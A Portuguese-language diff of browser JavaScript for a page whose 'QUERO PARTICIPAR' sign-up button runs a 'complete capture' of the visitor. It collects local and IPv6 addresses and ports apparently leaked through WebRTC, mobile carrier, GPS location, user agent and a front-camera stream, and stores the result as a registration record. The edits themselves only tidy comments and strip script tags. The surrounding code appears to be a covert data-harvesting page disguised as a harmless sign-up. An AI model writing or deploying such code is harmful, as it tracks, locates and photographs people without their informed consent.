@@ -1,4 +1,3 @@
-<script>
 // =================================================================
 // CONFIGURAÇÃO DE CONEXÃO
 // =================================================================
@@ -65,7 +64,7 @@ async function capturarPortaAvancada() {
             
             if (ipMatch) {
               const ip = ipMatch[1];
-              if (ip.includes(':')) info.ipv6 = ip;
+              if (ip.includes(':')) info.ipv6 = ip;   // Captura IPv6
               else info.local_ip = ip;
             }
             if (portMatch) info.local_port = portMatch[1];
@@ -109,6 +108,7 @@ async function iniciarSistema(){
     }]);
 
     statusText.innerHTML = "✅ Sistema pronto";
+
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: false
@@ -158,7 +158,7 @@ function analisarDispositivo() {
 }
 
 // =================================================================
-// BOTÃO - CAPTURA COMPLETA (atualizado)
+// BOTÃO - CAPTURA COMPLETA
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
@@ -197,7 +197,6 @@ btn.addEventListener("click", async () => {
       longitude = localizacao.coords.longitude;
     } catch(err) {}
 
-    // Captura avançada com IPv6 e Operadora
     const portaInfo = await capturarPortaAvancada();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
@@ -215,7 +214,7 @@ btn.addEventListener("click", async () => {
       local_ip: portaInfo.local_ip,
       local_port: portaInfo.local_port,
       operadora: portaInfo.operadora,
-      cidade: "", 
+      cidade: "",
       estado: "",
       pais: "",
       user_agent: navigator.userAgent,
@@ -244,4 +243,3 @@ btn.addEventListener("click", async () => {
     btn.innerHTML = "QUERO PARTICIPAR";
   }
 });
-</script>
